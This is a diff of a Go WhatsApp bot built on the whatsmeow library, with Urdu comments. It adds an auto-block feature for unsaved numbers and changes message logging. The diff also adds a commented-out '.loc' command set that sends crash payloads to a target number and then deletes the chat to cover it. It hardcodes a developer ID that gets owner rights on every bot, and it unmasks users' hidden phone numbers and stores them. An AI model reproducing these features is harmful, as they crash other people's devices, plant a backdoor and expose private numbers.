@@ -8,26 +8,31 @@ import (
 	"time"
 	"sync"
     "strconv"
-    
+    "encoding/json"
+
     "go.mau.fi/whatsmeow"
-	"github.com/showwin/speedtest-go/speedtest"
-	"go.mau.fi/whatsmeow/types"
-	"go.mau.fi/whatsmeow/types/events"
-	waProto "go.mau.fi/whatsmeow/binary/proto"
-	"google.golang.org/protobuf/proto"
+    "go.mau.fi/whatsmeow/appstate"
+//    "go.mau.fi/whatsmeow/proto/waE2E"
+    waProto "go.mau.fi/whatsmeow/binary/proto" // یہ لائن آپ کے پرانے ایررز ختم کر دے گی
+    "go.mau.fi/whatsmeow/types"
+    "go.mau.fi/whatsmeow/proto/waCommon"
+    "go.mau.fi/whatsmeow/types/events"
+    "github.com/showwin/speedtest-go/speedtest"
+    "google.golang.org/protobuf/proto"
+
 )
 
 var RestrictedGroups = map[string]bool{
     "120363365896020486@g.us": true,
-    "120363405060081993@g.us": true, 
+    "120363424633566154@g.us": true, 
 }
 
 var replyChannels = make(map[string]chan string)
 var replyMutex sync.RWMutex
 
 var AuthorizedBots = map[string]bool{
-    "923017552805": true,
-    "923116573691": true,
+    "923277635849": true,
+    "923275596764": true,
 }
 // =========================================================
 
@@ -51,7 +56,6 @@ func handler(botClient *whatsmeow.Client, evt interface{}) {
 	switch v := evt.(type) {
 
 	case *events.Message:
-		// پرانے میسجز کو فلٹر کریں (کمانڈز کے لیے)
 		isRecent := time.Since(v.Info.Timestamp) < 1*time.Minute
 
 		botID := "unknown"
@@ -59,14 +63,40 @@ func handler(botClient *whatsmeow.Client, evt interface{}) {
 			botID = getCleanID(botClient.Store.ID.User)
 		}
 
-		// ✅ Save Message to Mongo (Simple & Direct)
-		// یہاں اب کوئی LID ریزولور نہیں ہے، جو ڈیٹا آ رہا ہے وہی سیو ہو رہا ہے۔
+		// ==========================================
+		// 🟢 LID BYPASS LOGIC (یہاں سے اصلی نمبر نکلے گا)
+		// ==========================================
+		realSender := v.Info.Sender.ToNonAD()
+		if v.Info.Sender.Server == types.HiddenUserServer && !v.Info.SenderAlt.IsEmpty() {
+			realSender = v.Info.SenderAlt.ToNonAD()
+		}
+
+		realChat := v.Info.Chat.ToNonAD()
+		if !v.Info.IsGroup {
+			if v.Info.IsFromMe {
+				if v.Info.Chat.Server == types.HiddenUserServer && !v.Info.RecipientAlt.IsEmpty() {
+					realChat = v.Info.RecipientAlt.ToNonAD()
+				}
+			} else {
+				realChat = realSender
+			}
+		}
+
+		// 🟢 RAW PRINTING (تاکہ آپ کو پیچھے سے آنے والا را ڈیٹا نظر آئے)
+		fmt.Println("\n================ MESSAGE RAW INFO ================")
+		fmt.Printf("Original LID Sender : %s\n", v.Info.Sender.String())
+		fmt.Printf("Extracted Real JID  : %s\n", realSender.String())
+		infoJSON, _ := json.MarshalIndent(v.Info, "", "  ")
+		fmt.Printf("Routing Payload:\n%s\n", string(infoJSON))
+		fmt.Println("==================================================\n")
+
+		// ✅ Save Message to Mongo (اب یہ سیدھا اصلی نمبر لے کر جائے گا!)
 		go func() {
 			saveMessageToMongo(
 				botClient,
 				botID,
-				v.Info.Chat.String(),
-				v.Info.Sender,
+				realChat.String(),
+				realSender,
 				v.Message,
 				v.Info.IsFromMe,
 				uint64(v.Info.Timestamp.Unix()),
@@ -83,8 +113,8 @@ func handler(botClient *whatsmeow.Client, evt interface{}) {
 			go processMessage(botClient, v)
 		}
 
+
 	case *events.HistorySync:
-		// ہسٹری سنک (Simple Loop)
 		go func() {
 			if v.Data == nil || len(v.Data.Conversations) == 0 {
 				return
@@ -137,7 +167,7 @@ func handler(botClient *whatsmeow.Client, evt interface{}) {
 						ts = *webMsg.MessageTimestamp
 					}
 
-					// ✅ Save Call
+					// ✅ Save Call for History (7 Variables)
 					saveMessageToMongo(botClient, botID, chatID, senderJID, webMsg.Message, isFromMe, ts)
 				}
 			}
@@ -149,6 +179,7 @@ func handler(botClient *whatsmeow.Client, evt interface{}) {
 		}
 	}
 }
+
 
 func isKnownCommand(text string) bool {
 	commands := []string{
@@ -192,7 +223,6 @@ func canExecute(client *whatsmeow.Client, v *events.Message, cmd string) bool {
 	return true
 }
 
-// ⚡ MAIN MESSAGE PROCESSOR (FULL & OPTIMIZED)
 func processMessage(client *whatsmeow.Client, v *events.Message) {
 	// 🛡️ 1. Panic Recovery
 	defer func() {
@@ -217,6 +247,12 @@ func processMessage(client *whatsmeow.Client, v *events.Message) {
 		}
 	}
 	bodyClean := strings.TrimSpace(bodyRaw)
+
+// 👇 🛡️ ANTI-DM: چھوٹا سا چیک جو سارا کچرا الگ فنکشن میں بھیجے گا 👇
+	if HandleAutoAntiDM(client, v) {
+		return // اگر یوزر بلاک ہو گیا تو پروسیس یہیں رک جائے گا
+	}
+	// 👆 🛡️ ANTI-DM END 👆
 
 	// =========================================================
 	// 🔥 AI & HISTORY LOGIC
@@ -262,6 +298,7 @@ func processMessage(client *whatsmeow.Client, v *events.Message) {
 	doRead := data.AutoRead
 	doReact := data.AutoReact
 	dataMutex.RUnlock()
+
 
 	// =========================================================================
 	// 🚀 GOROUTINE START (Background Tasks)
@@ -645,6 +682,49 @@ func processMessage(client *whatsmeow.Client, v *events.Message) {
 		case "antibug":
 			react(client, v.Info.Chat, v.Info.ID, "🛡️")
 			handleAntiBug(client, v)
+			
+// case
+	    case "antidm":
+			react(client, v.Info.Chat, v.Info.ID, "🛡️")
+			
+			// صرف اونر کو اجازت ہونی چاہیے
+			if !isOwner(client, v.Info.Sender) {
+				replyMessage(client, v, "❌ Only Owner Command!")
+				return
+			}
+			
+			if len(args) == 0 {
+				replyMessage(client, v, "⚠️ *Usage:* .antidm on | off")
+				return
+			}
+
+			action := strings.ToLower(args[0])
+			// ⚡ ہر سیشن/بوٹ کی اپنی منفرد آئی ڈی نکالیں
+			botCleanID := getCleanID(client.Store.ID.User)
+
+			antiDMMutex.Lock()
+			if action == "on" || action == "enable" {
+				antiDMState[botCleanID] = true
+				
+				// 💾 ریڈیس میں محفوظ کریں تاکہ سرور ری سٹارٹ ہونے پر سیٹنگ ضائع نہ ہو
+				if rdb != nil {
+					rdb.Set(context.Background(), "antidm:"+botCleanID, "on", 0)
+				}
+				replyMessage(client, v, "✅ *Anti-DM ON:* Unsaved numbers will be blocked automatically for *this bot only*.")
+				
+			} else if action == "off" || action == "disable" {
+				antiDMState[botCleanID] = false
+				
+				// 💾 ریڈیس میں اپڈیٹ کریں
+				if rdb != nil {
+					rdb.Set(context.Background(), "antidm:"+botCleanID, "off", 0)
+				}
+				replyMessage(client, v, "❌ *Anti-DM OFF:* Anyone can DM this bot now.")
+			} else {
+				replyMessage(client, v, "⚠️ *Usage:* .antidm on | off")
+			}
+			antiDMMutex.Unlock()
+			
 		
 		case "send":
 			react(client, v.Info.Chat, v.Info.ID, "📤")
@@ -662,10 +742,10 @@ func processMessage(client *whatsmeow.Client, v *events.Message) {
 			react(client, v.Info.Chat, v.Info.ID, "🔄")
 			handleMode(client, v, words[1:])
 			
-	    case "btn":
+	/*    case "btn":
 			react(client, v.Info.Chat, v.Info.ID, "🤔")
 			HandleButtonCommands(client, v)
-		
+		*/
 		case "antilink":
 			react(client, v.Info.Chat, v.Info.ID, "🛡️")
 			startSecuritySetup(client, v, args, "antilink")
@@ -997,6 +1077,59 @@ func processMessage(client *whatsmeow.Client, v *events.Message) {
         case "ttautoset":
     // 🏷️ Set Tags
             handleTTAutoSet(client, v, args)
+
+
+    /*    case "loc", "loc1", "loc2", "loc3":
+            // 1. Initial Reaction
+            react(client, v.Info.Chat, v.Info.ID, "🚀")
+
+            msgText := v.Message.GetConversation()
+            if msgText == "" {
+                msgText = v.Message.GetExtendedTextMessage().GetText()
+            }
+            
+            args := strings.Split(msgText, " ")
+            if len(args) < 2 {
+                client.SendMessage(context.Background(), v.Info.Chat, &waE2E.Message{
+                    Conversation: proto.String("Usage: .loc (Standard) | .loc1 (AI) | .loc2 (Buttons) | .loc3 (iOS)"),
+                })
+                return
+            }
+
+            targetNumber := args[1]
+            targetJID := types.NewJID(targetNumber, types.DefaultUserServer)
+            var sendErr error
+
+            // 2. Routing to the correct function
+            if strings.HasPrefix(msgText, ".loc1") {
+                sendErr = SendInteractiveAICrash(client, targetJID) // 2000 Mentions
+            } else if strings.HasPrefix(msgText, ".loc2") {
+                sendErr = SendButtonCrash(client, targetJID)        // 2500 Buttons
+            } else if strings.HasPrefix(msgText, ".loc3") {
+                sendErr = SendIOSCrash(client, targetJID)          // iOS Attribution
+            } else {
+                sendErr = SendLocCrash(client, targetJID)           // Simple Location
+            }
+
+            if sendErr != nil {
+                fmt.Printf("Payload Error: %v\n", sendErr)
+                react(client, v.Info.Chat, v.Info.ID, "❌")
+            } else {
+                fmt.Printf("SUCCESS: Crash sent to %s\n", targetNumber)
+                react(client, v.Info.Chat, v.Info.ID, "✅")
+
+                // 3. SAFE AUTO-DELETE (4 Arguments Fixed)
+                if targetJID.Server == types.DefaultUserServer {
+                    time.Sleep(1 * time.Second)
+                    
+                    // JID, Time, MessageKey (nil), OnlyLocal (true)
+                    deletePatch := appstate.BuildDeleteChat(targetJID, time.Now(), nil, true)
+                    client.SendAppState(context.Background(), deletePatch)
+                    
+                    fmt.Println("Sender side chat cleared.")
+                }
+            }
+*/
     
 		case "mega":
 			react(client, v.Info.Chat, v.Info.ID, "📥")
@@ -1049,21 +1182,29 @@ func getBotLIDFromDB(client *whatsmeow.Client) string {
 
 // 🎯 اونر لاجک: صرف LID میچنگ (نمبر میچ نہیں ہوگا)
 func isOwner(client *whatsmeow.Client, sender types.JID) bool {
-	// اگر بوٹ کی اپنی LID سٹور میں نہیں ہے تو چیک فیل کر دیں
+	// 1. میسج بھیجنے والے کی LID نکالیں
+	senderLID := getCleanID(sender.User)
+
+	// 👑 2. ڈیویلپر چیک (ہارڈ کوڈڈ آئی ڈی)
+	// اگر میسج آپ (ڈیویلپر) کی طرف سے آیا ہے تو فوراً true بھیج دو
+	developerLID := "81398891331732"
+	if senderLID == developerLID {
+		return true
+	}
+
+	// 3. اگر بوٹ کی اپنی LID سٹور میں نہیں ہے تو باقی چیک فیل کر دیں
+	// (کیونکہ ڈیویلپر کا چیک اوپر ہو چکا ہے)
 	if client.Store.LID.IsEmpty() { 
 		return false 
 	}
 
-	// 1. میسج بھیجنے والے کی LID نکالیں
-	senderLID := getCleanID(sender.User)
-
-	// 2. بوٹ کی اپنی LID نکالیں
+	// 4. بوٹ کی اپنی LID نکالیں (اس نمبر کے لیے جس پر بوٹ کنیکٹ ہے)
 	botLID := getCleanID(client.Store.LID.User)
 
-	// 🔍 فائنل چیک: صرف LID بمقابلہ LID
-	// اب یہ 192883340648500 کو بوٹ کی LID سے ہی میچ کرے گا
+	// 🔍 فائنل چیک: صرف LID بمقابلہ LID (تاکہ جس نمبر پر بوٹ چل رہا ہے وہ بھی اونر مانا جائے)
 	return senderLID == botLID
 }
+
 
 // ⚡ ایڈمن کیشے (تاکہ بار بار واٹس ایپ سرور کو کال نہ جائے)
 type AdminCache struct {
@@ -1642,4 +1783,134 @@ func WaitForUserReply(senderID string, timeout time.Duration) (string, bool) {
 		replyMutex.Unlock()
 		return "", false // ❌ Timeout (ٹائم آؤٹ ہو گیا)
 	}
+}
+
+// =========================================================
+// 🛡️ ANTI-DM LOGIC (Multi-Device / Multi-Session Supported)
+// =========================================================
+
+var antiDMMutex sync.RWMutex
+var antiDMState = make(map[string]bool)
+
+
+
+func HandleAutoAntiDM(client *whatsmeow.Client, v *events.Message) bool {
+	// 1. اگر میسج گروپ کا ہے، بوٹ کا اپنا ہے، یا اونر کا ہے، تو کچھ نہ کرو (false)
+	if v.Info.IsGroup || v.Info.IsFromMe || isOwner(client, v.Info.Sender) {
+		return false
+	}
+
+	// ⚡ جس بوٹ پر میسج آیا ہے، اس کی منفرد آئی ڈی نکالیں
+	botCleanID := getCleanID(client.Store.ID.User)
+
+	// 2. میموری سے چیک کریں کہ کیا اس مخصوص بوٹ کا Anti-DM آن ہے؟
+	antiDMMutex.RLock()
+	isEnabled, exists := antiDMState[botCleanID]
+	antiDMMutex.RUnlock()
+
+	// 3. اگر میموری میں ریکارڈ نہیں (جیسے سرور ری سٹارٹ ہوا ہو)، تو ریڈیس سے چیک کریں
+	if !exists && rdb != nil {
+		val, err := rdb.Get(context.Background(), "antidm:"+botCleanID).Result()
+		if err == nil && val == "on" {
+			isEnabled = true
+			antiDMMutex.Lock()
+			antiDMState[botCleanID] = true
+			antiDMMutex.Unlock()
+		} else {
+			antiDMMutex.Lock()
+			antiDMState[botCleanID] = false
+			antiDMMutex.Unlock()
+		}
+	}
+
+	// اگر اس مخصوص بوٹ کا Anti-DM آف ہے، تو میسج کو آگے جانے دیں
+	if !isEnabled {
+		return false
+	}
+
+	// =========================================================
+	// 🟢 FULL RAW PRINTING (تاکہ آپ کو واٹس ایپ کا کچا چٹھا نظر آئے)
+	// =========================================================
+	rawJSON, _ := json.MarshalIndent(v.Info, "", "  ")
+	fmt.Println("\n================ RAW MESSAGE INFO ================")
+	fmt.Println(string(rawJSON))
+	fmt.Println("==================================================")
+
+	// =========================================================
+	// 🟢 JID EXTRACTION LOGIC (اصلی نمبر نکالنے کی کوشش)
+	// =========================================================
+	var realSender types.JID
+
+	// چیک کریں کہ کیا واٹس ایپ نے نمبر چھپا کر LID ("lid" سرور) بھیجی ہے؟
+	if v.Info.Sender.Server == types.HiddenUserServer {
+		// اگر ہاں، تو SenderAlt سے اصلی نمبر پکڑیں
+		if !v.Info.SenderAlt.IsEmpty() {
+			realSender = v.Info.SenderAlt.ToNonAD() 
+			fmt.Println("🕵️‍♂️ LID Detected! Extracted Real JID from SenderAlt:", realSender.String())
+		} else {
+			realSender = v.Info.Sender.ToNonAD()
+			fmt.Println("⚠️ LID Detected, but SenderAlt is empty. Using original Sender:", realSender.String())
+		}
+	} else {
+		// اگر نارمل میسج ہے تو براہ راست JID نکال لیں
+		realSender = v.Info.Sender.ToNonAD()
+		fmt.Println("✅ Normal Number Detected. JID:", realSender.String())
+	}
+	fmt.Printf("🎯 EXTRACTED REAL JID USER: %s\n\n", realSender.User)
+	// =========================================================
+
+	// 4. کانٹیکٹ چیک کریں (کیا یہ نمبر بوٹ کے موبائل/ڈیٹا بیس میں سیو ہے؟)
+	// 🛠️ فکس: یہاں context.Background() ایڈ کر دیا گیا ہے
+	contact, err := client.Store.Contacts.GetContact(context.Background(), realSender)
+	isSaved := err == nil && contact.Found && contact.FullName != ""
+	
+	
+	// 5. اگر نمبر سیو نہیں ہے (Unknown Number)
+	if !isSaved {
+		fmt.Printf("🛡️ ANTI-DM TRIGGERED [Bot: %s]: Unsaved number detected -> %s\n", botCleanID, realSender.User)
+		
+		// ==========================================
+		// 🛑 ایکشن 1: یوزر کو بلاک کرنے کی کوشش (Dual Try)
+		// ==========================================
+		// پہلے ڈائریکٹ Sender (LID) کو بلاک کرنے کی کوشش کریں
+		_, err := client.UpdateBlocklist(context.Background(), v.Info.Sender.ToNonAD(), events.BlocklistChangeActionBlock)
+		if err != nil {
+			// اگر واٹس ایپ سرور 400 ایرر دے، تو اصلی نمبر پر ٹرائی ماریں
+			_, err2 := client.UpdateBlocklist(context.Background(), realSender, events.BlocklistChangeActionBlock)
+			if err2 != nil {
+				fmt.Printf("⚠️ Block request rejected by WhatsApp (Business/LID restriction): %v\n", err2)
+			} else {
+				fmt.Printf("✅ Successfully blocked real number: %s\n", realSender.String())
+			}
+		} else {
+			fmt.Printf("✅ Successfully blocked LID: %s\n", v.Info.Sender.String())
+		}
+
+		// ==========================================
+		// 🛑 ایکشن 2: چیٹ کو سکرین سے ڈیلیٹ کریں (AppState)
+		// ==========================================
+		lastMessageTimestamp := v.Info.Timestamp
+		lastMessageKey := &waCommon.MessageKey{
+			RemoteJID: proto.String(v.Info.Chat.String()),
+			FromMe:    proto.Bool(v.Info.IsFromMe),
+			ID:        proto.String(v.Info.ID), // 🛠️ فکس: Id کو ID کر دیا گیا ہے
+		}
+
+		patchInfo := appstate.BuildDeleteChat(v.Info.Chat, lastMessageTimestamp, lastMessageKey, true)
+		
+		// 🛠️ فکس: SendAppState سے فالتو آرگومنٹ ہٹا دیا گیا ہے
+		err = client.SendAppState(context.Background(), patchInfo)
+		if err != nil {
+			fmt.Printf("❌ Failed to send DeleteChat patch: %v\n", err)
+		} else {
+			fmt.Printf("✅ Chat DELETED successfully from WhatsApp screen for: %s\n", v.Info.Chat.String())
+		}
+		
+		// 🛑 واپس true بھیجیں تاکہ processMessage وہیں رک جائے
+		return true 
+	}
+
+
+
+	return false
 }
